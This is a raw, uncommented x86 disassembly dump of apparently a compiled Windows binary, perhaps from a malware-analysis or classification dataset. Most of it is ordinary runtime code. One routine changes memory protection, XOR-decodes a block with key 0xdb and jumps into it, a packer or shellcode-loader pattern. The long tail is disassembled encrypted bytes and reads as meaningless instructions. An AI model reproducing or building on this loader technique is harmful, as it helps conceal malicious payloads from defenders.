mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov al [ eax + 0x5 ]
dec al
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
sub_460820
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_404374
call sub_4085f0
mov esi eax
push 0x0
push esi
mov eax [ ebx + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
test eax eax
jg r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_40861c
mov eax ebx
pop esi
pop ebx
retn
sub_46085c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_404374
call sub_4085f0
mov esi eax
push 0x1
push esi
mov eax [ ebx + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
test eax eax
jg r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_40861c
mov eax ebx
pop esi
pop ebx
retn
sub_460898
push ebx
push esi
push edi
mov edi eax
mov bl 0x1
mov eax [ edi + 0x10 ]
call sub_404374
call sub_4085f0
mov esi eax
push 0x1
push esi
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
test eax eax
jg r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
test eax eax
jg r-xdata
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_40861c
mov eax ebx
pop edi
pop esi
pop ebx
retn
xor ebx ebx
sub_4608ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov [ edi + 0xc ] esi
xor eax eax
mov [ edi + 0x10 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_460930
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov eax [ esi + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
xor eax eax
mov [ esi + 0x14 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_46097c
push edx
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov edx eax
cmp edx 0x6
ja r-xdata
retn
jmp [ edx * 4 + jump_table_46099b ]
xor eax eax
retn
mov eax 0x3
retn
mov eax 0x2
retn
mov eax 0x6
retn
mov eax 0x5
retn
mov eax 0x1
sub_4609d8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403834#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b68
lea eax [ ebp - 0x20 ]
mov edx 0x7
call sub_403ed8
retn
mov edx ebx
mov eax esi
call sub_45e6cc
test eax eax
jg r-xdata
mov [ ebx + 0x10 ] edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
test eax eax
jg r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
push r-xdata
mov eax ebx
call sub_460e5c
lea edx [ ebp - 0x14 ]
call sub_460fbc
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_460e5c
lea edx [ ebp - 0x18 ]
call sub_460f78
push [ ebp - 0x18 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_460e5c
call sub_460fe8
lea edx [ ebp - 0x1c ]
call sub_407de8
push [ ebp - 0x1c ]
push r-xdata
push r-xdata
mov eax ebx
call sub_460e5c
lea edx [ ebp - 0x20 ]
call sub_461014
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0xc
call sub_404234
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax esi
mov edx [ r-xdata ]
call sub_4032a8
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_460bd0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403834#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460d5d
lea eax [ ebp - 0x20 ]
mov edx 0x7
call sub_403ed8
retn
mov edx ebx
mov eax esi
call sub_45e6cc
test eax eax
jg r-xdata
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
test eax eax
jg r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
push r-xdata
mov eax ebx
call sub_460e5c
lea edx [ ebp - 0x14 ]
call sub_460fbc
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_460e5c
lea edx [ ebp - 0x18 ]
call sub_460f78
push [ ebp - 0x18 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_460e5c
call sub_460fe8
lea edx [ ebp - 0x1c ]
call sub_407de8
push [ ebp - 0x1c ]
push r-xdata
push r-xdata
mov eax ebx
call sub_460e5c
lea edx [ ebp - 0x20 ]
call sub_461014
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0xc
call sub_404234
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax esi
mov edx [ r-xdata ]
call sub_4032a8
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
sub_460dc4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
mov edx esi
mov eax ebx
call sub_46097c
cmp eax 0x2
je r-xdata
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
cmp eax 0x3
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_460e10
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
mov edx esi
mov eax ebx
call sub_46097c
cmp eax 0x2
je r-xdata
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
cmp eax 0x3
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_460e5c
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_460f14
mov [ ebx + 0x8 ] eax
sub_460e84
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov [ edi + 0x4 ] esi
xor eax eax
mov [ edi + 0x8 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_460ecc
push ebx
push esi
push edi
call sub_40346c
mov ebx edx
mov edi eax
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
mov esi [ edi + 0xc ]
test esi esi
je r-xdata
mov eax esi
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4030e8
test bl bl
jle r-xdata
mov eax esi
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403454
sub_460f14
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_460f50
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_460f78
push ebx
push esi
add esp 0xfffffbfc
mov esi edx
mov ebx eax
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov edx esi
call sub_4085bc
add esp 0x404
pop esi
pop ebx
retn
sub_460fbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov edx esi
call sub_4085bc
pop esi
pop ebx
retn
sub_460fe8
push ebx
push ecx
mov ebx eax
push esp
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ esp ]
pop edx
pop ebx
retn
sub_461014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov edx esi
call sub_4085bc
pop esi
pop ebx
retn
sub_461040
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403834#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461073
retn
call sub_45fa20
sub_4612c0
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
nop
nop
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
jno r-xdata
mov [ ebp - 0x14 ] eax
nop
nop
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_403038
sub_4612f4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
nop
lea eax [ ebp - 0x10 ]
push eax
push 0x40
push 0x564f
mov eax [ ebp - 0x4 ]
push eax
call [ ebp - 0xc ]
xor eax eax
mov [ ebp - 0x8 ] eax
nop
nop
mov eax [ ebp - 0x4 ]
nop
add eax [ ebp - 0x8 ]
nop
mov bl [ eax ]
nop
nop
xor bl 0xdb
nop
mov [ eax ] bl
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x5650
jne r-xdata
mov esp ebp
pop ebp
retn
sub_46133c
push ebp
mov ebp esp
add esp 0xffffffec
nop
nop
cmp [ ebp + 0x8 ] 0x0
je r-xdata
nop
nop
push r-xdata
call sub_46133c
fcmovnu st3
fcmovnu st3
fcmovnu st3
mov cl 0xb2
mov ebp 0x83379e52
mov cl 0xad
mov ebp 0x32359e52
fcom [ ebx - 0x24242425 ]
fstp [ ebp + 0x5063a652 ]
and [ ebp - 0x4e9e59ae ] edi
scasb [ edi ]
xor ch [ esi ]
jmp 0xffffffffdc21ef9e
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ ebp - 0x8 ] eax
nop
nop
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
call sub_4612f4
nop
mov eax [ ebp + 0x8 ]
add eax 0x40b7
jae r-xdata
mov [ ebp - 0x4 ] eax
jmp [ ebp - 0x4 ]
call sub_403038
sub_46145a
push edx
sahf
and esi [ edx ]
xchg esi eax
xchg ebp eax
fcmovnu st3
mov bl 0xdb
jmp r-xdata
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
mov [ eax - 0x3acd3e4f ] cl
sub_461467
and al 0xad
mov esp [ ebp * 4 + 0x3fae24ef ]
xor al [ ecx - 0x24242438 ]
xor [ ecx - 0x61ad4241 ] 0x33
xor [ ecx - 0x61ad4246 ] 0x31
xor [ ecx - 0x61ad4244 ] 0x37
xor [ ecx - 0x61ad4242 ] 0x35
xor [ ecx - 0x3dcbcd4b ] 0xffffffdb
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
xor ecx edx
jmp r-xdata
mov ebp 0x83319e52
mov cl 0xbc
mov ebp 0x83379e52
mov cl 0xbe
mov ebp 0x83359e52
mov cl 0xb5
xor dh [ edx + eax * 8 ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
sub_461597
and al 0x8d
jecxz r-xdata
scasb [ edi ]
clc
fcmovnu st3
mov bl 0xf4
cmp [ esi ] 0x45
mov [ edx + 0x45 ] dl
or ebx ebx
fcmovnu st3
xor esp [ ecx - 0x23 ]
fcmovnu st3
mov bl 0xaa
lea ebp [ ebx - 0x15 ]
xor bl cl
retn
add ebx [ eax + 0x20 ]
and al 0x32
retn
sub_4615e2
and al 0x8d
xchg ebx eax
push eax
add ebx [ esi ]
aam 0x5f
scasb [ edi ]
clc
fcmovnu st3
mov bl 0xf4
cmp [ esi ] 0x45
mov [ edx + 0x45 ] dl
or ebx ebx
fcmovnu st3
xor esp [ ecx - 0x23 ]
fcmovnu st3
mov bl 0xaa
lea ebp [ ebx - 0x15 ]
xor bl cl
retn
sub_461697
xor eax ebp
fstp st3
fistp [ eax + 0x1f ]
fwait
xor bh [ ebp + 0x58242424 ]
and bh bl
aam 0x59
mov edx 0x9cdbdbdc
pop eax
and al 0xd8
aam 0x59
js r-xdata
push edx
sahf
das
xor bl [ edx - 0x2f ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
push edx
popfd

fcmovnu st3
xor dh [ ecx + 0x56dbdb92 ]
sahf
dec edi
mov ecx [ ebp + 0x26575656 ]
and al 0x24
xor edi [ ecx - 0x6d ]
fcmovnu st3
add [ edx - 0x243dadce ] 0xdb
sub_46171d
pop eax
pop ds
xlat
push esi
lahf
jmp r-xdata
into
ja r-xdata
and al 0x24
xor edi [ ecx - 0x6d ]
fcmovnu st3
add [ edx - 0x243dadce ] 0xdb
fcmovnu st3
xor dl [ ebp - 0x1 ]
fcmovnu st3
fcmovnu st3
lea edx [ eax + 0x1a ]
xor dh [ edx ]
xchg edi eax
fcmovnu st3
fcmovnu st3
fstp [ ebp - 0x7dd069ae ]
mov cl 0xa3
mov ebp 0x322d9652
pop eax
sub_46172f
aam 0x5e
add eax 0xb1dbdbeb
mov ah 0x32
mov edi 0xdbdbdbc4
fcmovnu st3
fcmovnu st3
fcmovnu st3
fisttp [ esi - 0x61cdc8b0 ]
fstp st3
fcmovnu st3
mov bl 0xfd
mov eax 0x52884cb1
pop ebp
xor ebx ebx
fcmovnu st3
xor eax [ edi + 0x58dbdbde ]
pop ds
sti
xor ah [ ebx ]
cli
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
push eax
sahf

sub_4618b4
fist [ eax + 0x23 ]
pop esi
and al 0xd4
pop edi
sub dh dl
fcmovnu st3
mov cl 0xdf
mov bl 0xdb
jmp r-xdata
sahf
pop ss
loopne r-xdata
fwait
fcmovnu st3
fcmovnu st3
fcmovnu st3
out dx eax
aam 0x5e
sub_4618e3
fisttp [ edx - 0x2c61af76 ]
xor dl [ edx - 0x34 ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnbe st4
pop edi
mov ebp 0xd4dbdbf6
insd
cwde
jecxz r-xdata
push edx
sahf
sub eax 0xbdbdb183
push edx
sahf
popfd
retn
and eax [ ebx + 0x3a32f5b1 ]
aad 0xdb
fisttp [ ebx - 0x246b14ce ]
fcmovnu st3
fcmovnu st3
fisttp [ esi - 0x7fcdc8b0 ]
sahf
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
and al 0x4c
ja r-xdata
fcmovnu st3
xor cl [ eax - 0x1b ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fstp [ ebp + 0x500b9e52 ]
sbb [ ebp - 0x7cf661ae ] edi
mov cl 0xf5
xor [ ecx - 0x6f2ecd5e ] 0xdb
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fistp [ ebx - 0x240840ce ]
fcmovnu st3
aam 0x6c
0x9232
sub_461908
aam 0x5e
cmpsb [ esi ] [ edi ]
nop
fcmovnu st3
xor cl [ edx - 0x2424242d ]
push eax
sbb eax 0xd9e52bd
push eax
sbb [ ebp + 0x50039e52 ] bh
sbb bh [ ebp + 0x32019e52 ]
leave
out 0xdb eax
fcmovnu st3
mov ebp 0xb12f9652
mov esi 0xbdb7b183
push edx
sahf
sub eax 0xbdbdb183
push edx
sahf
and eax [ ebx + 0x3a32f5b1 ]
aad 0xdb
fisttp [ ebx - 0x246b14ce ]
fcmovnu st3
fcmovnu st3
fisttp [ esi - 0x7fcdc8b0 ]
sahf
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
and al 0x4c
ja r-xdata
fcmovnu st3
xor cl [ eax - 0x1b ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fstp [ ebp + 0x500b9e52 ]
sbb [ ebp - 0x7cf661ae ] edi
mov cl 0xf5
xor [ ecx - 0x6f2ecd5e ] 0xdb
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fistp [ ebx - 0x240840ce ]
fcmovnu st3
aam 0x6c
0x9232
sub_4619c9
xor ecx [ edi + 0x32dbdbe1 ]
fcmovu st0
fcmovnu st3
fcmovnu st3
fucomi st0
sbb eax [ ebp - 0x246fd8ce ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
push eax
or eax 0xe18e52bd
push eax
and edi [ ebp + 0x502ba652 ]
or esi [ edx ]
inc ebx
xchg ebx eax
fcmovnu st3
fcmovnu st3
fistp [ eax + 0x1f ]

sub_462846
push eax
sahf
shl [ esi + ebp * 4 ] cl
das
xor dl [ ebp + 0x25 ]
and al 0x24
fcmovnu st3
fcmovnu st3
xor ebx [ ebx + 0x50dbdbcd ]
mov ss di
xor ecx [ eax + eax * 8 + 0x248bdbdb ]
scasb [ edi ]
shl [ ebx ] cl
rcr cl 0x1
fcmovnu st3
add [ edx - 0x2424e7ee ] 0xdb
push eax
sahf
daa
fcomp [ esi + 0x239e52cb ]
push eax
sahf
daa
xor ah [ ebx ]
int1
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
pop esi
sbb esi [ edx ]
add edi esp
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnbe st4
pop edi
adc bh ah
fcmovnu st3
xor dl [ eax + 0x29 ]
and al 0x24
fcmovnu st3
mov bl 0xdb
pop ebx
fcmovnu st3
mov cl 0xdb
and al 0xaf
push ebx
and al 0x8d
scasd [ edi ]
xor dh [ ebx - 0x2424240a ]
fcmovnu st3
mov ebp 0x80938652
mov ebp 0x50918652
add edi [ ebp + 0x50978652 ]
add bh [ ebp + 0x50958652 ]
add al 0xbd
push edx
xchg [ ebx + 0x550a9b1 ] cl
mov ebp 0x50898652
add edi [ ebp + 0x508f8652 ]
add bh [ ebp + 0x508d8652 ]
add edi [ ebp - 0x177c79ae ]
add [ ebp + 0x50818652 ] bh
add al 0xbd
push edx
xchg [ edi ] al
xor al [ edx - 0x2424242a ]
fisttp [ esi + 0x37583750 ]
jmp r-xdata
sub_462980
mov cl 0xdf
mov bl 0xdb
jmp r-xdata
pop edi
loope r-xdata
mov [ 0xffffffffdbdbdbde ] al
fcmovnu st3
fcmovnu st3
fcmovnu st3
lea ecx [ ebx + esi - 0x242404f3 ]
push eax
and ebx [ esi + 0x24 ]
aam 0x5f
fcmovnu st3
mov bl 0xf9
fldenv [ ecx + edx * 2 - 0x74 ]
xor edx [ edx + 0x50242428 ]
add eax [ edx + 0x27865282 ]
pop esi
add ah dl
pop edi
sti
out 0xdb al
sub_462b3b
mov cl 0xdb
and al 0x4d
ja r-xdata
mov cl 0xdc
mov [ esp + ecx * 2 ] ah
cmp ebx ebx
fcmovnu st3
xor dl [ edi ]
and ah [ esp ]
fisttp [ ebx + esi + 0x24242a52 ]
add [ edx + 0x5fd41b5e ] 0xd3
fcmovnu st3
fcmovnu st3
mov cl 0x9b
arpl bx bx

sub_462bbf
mov cl 0xdf
push edx
lahf
push ebx
mov bl 0xdb
jmp r-xdata
fcmovnu st3
fcmovnu st3
xor bl [ eax - 0x29 ]
fcmovnu st3
mov bl 0xd3
fstpnce st3
fist [ edx - 0x62 ]
or esi [ edx ]
in al dx
rcr ebx 0x1
fcmovnu st3
fist [ eax - 0x68 ]
iretd
sub_4630b9
pop esi
and [ si ] esp
and al 0xd4
pop edi
rcr esi cl
fcmovnu st3
push esi
mov es [ edi ]
xor dh cl
int 0xdb
fucomi st0
sbb ebp eax
or [ edx ] esi
rcr dl cl
fcmovnu st3
fcmovnu st3
sub_4632a2
and al 0xaa
daa
push eax
fidiv [ edx ]
jae r-xdata
xor [ ecx - 0x61ad4253 ] 0x2b
xor [ ecx - 0x61ad4255 ] 0x29
xor [ ecx + 0x384632f5 ] 0x24
and al 0xdb
call 0xffffffff8c6ac01d
xchg edi eax
pop esi
sbb edx esp
pop edi
and esi [ eax ]
and al 0x24
xor bl [ ecx - 0x24242430 ]
fcmovnu st3
fcmovnu st3
fcmovnbe st4
pop edi
call 0x33220ed8
and al 0x24
fcmovnu st3
xor dh [ edi + edi ]
and al 0x24
fcmovnu st3
fcmovnu st3
fcmovnu st3
mov [ ebp - 0x240655ce ] cl
fcmovnbe st4
pop esp
scasb [ edi ]
salc
fcmovnu st3
xor dl [ edx + 0x30 ]
and al 0x24
fisttp [ esi + 0x37583750 ]

sub_46337f
sti
and al 0x8d
scasd [ edi ]
and al 0x9f
dec edi
push eax
lahf
dec edi
loopne r-xdata
mov gs di
mov cl 0xb9
cmp [ ebp - 0x4e1271ae ] 0xa652bdbc
aaa
cmp [ ebp + 0x50e38e52 ] 0xa652bd25
xor eax 0x243d4432
and al 0x50
add [ ebp + 0x32d98652 ] edi
push 0xdbdbdbda
mov cl 0xb5
mov ebp 0x32359652
inc edx
std
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
aam 0x5e
rcr ebx cl
fcmovnu st3
mov cl 0xdb
and al 0x4d
ja r-xdata
fstp st4
pop ecx
test al 0xd8
fcmovnu st3
call 0xffffffffffe585b4
iretd
xor ch [ eax - 0x26 ]
fcmovnu st3
fcmovnu st3
mov bl 0xdb
pop ebx
fcmovnu st3
mov cl 0xdb
and al 0xaf
sub_463409
mov cl 0xa9
mov ebp 0x830b9e52
mov ebp 0xb1099e52
mov esi 0x9e52bd83
psubsb mm3 [ ebx ]
xor dh [ ebp + 0x38 ]
and al 0x24
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
pop ebx
cmpsb [ esi ] [ edi ]

sub_46344d
fist [ eax + 0x6c ]
add ebx ebx
fcmovnu st3
loopne r-xdata
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
popfd
loopne r-xdata
aam 0x5f
rcl al 0x1
fcmovnu st3
xor ah [ edx - 0x24 ]
fcmovnu st3
aam 0x6d
and eax esi
sbb al 0xd4
pop esi
frstor [ edx ]
and al 0x24
xor bh [ 0xffffffffdbdbdbc6 ]
pop eax
sbb dl bl
push ebx
pop esi
pop ds
xor bh ch
cmp [ esp ] esp
add esp [ esp ]
and al 0x32
xor bl ah
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fist [ esi - 0x62 ]
push ebx
mov esi [ edx ]
cdq
cmp [ esp ] esp
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
xor edx [ eax - 0x38 ]
fcmovnu st3
mov cl 0xcb
xor bl [ edi ]
cmp esp [ esp ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fistp [ eax - 0x60 ]
fwait
fcmovnbe st4
pop edi
inc esi
xor bl [ ecx - 0x24242409 ]
fist [ eax - 0x6a ]
rcl [ eax - 0x62 ] cl
daa
push eax
iretd
sub_463590
pop edx
fcmovnu st3
fld [ edi ]
fcmovu st3
fcmovnbe st4
push edi
rcr ebx cl
fcmovnu st3
mov cl 0xdb
and al 0x4d
ja r-xdata
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnu st3
fistp [ edx + 0x65 ]
fcmovnu st3
fcmovnu st3
push esi
push esi
and esp [ esi ]
and al 0x24
xor edx [ esi + 0x58dbdbf3 ]
and ebx [ ebx - 0x242ca62c ]
fcmovnu st3
mov cl 0xdb
and al 0x4d
ja r-xdata
fcmovnu st3
fcmovnu st3
xor ch [ edx ]
rcr bl 0x1
fcmovnu st3
fcmovnu st3
push esi
xchg esi eax
pop es
xor ebx [ 0x56dbdbd3 ]
pop esi
adc esp [ esi ]
and al 0x24
mov esi [ edx ]
push ds
call 0xffffffffdc2211bd
fisttp [ eax + 0x321c508d ]
pop ebx
rcr ebx cl
fcmovnu st3
fcmovnu st3
fcmovnu st3
xor cl [ edx - 0x24dbdbc1 ]
fcmovnu st3
fcmovnu st3
call 0x32d1c312
pop edi
retn 0xdbdb
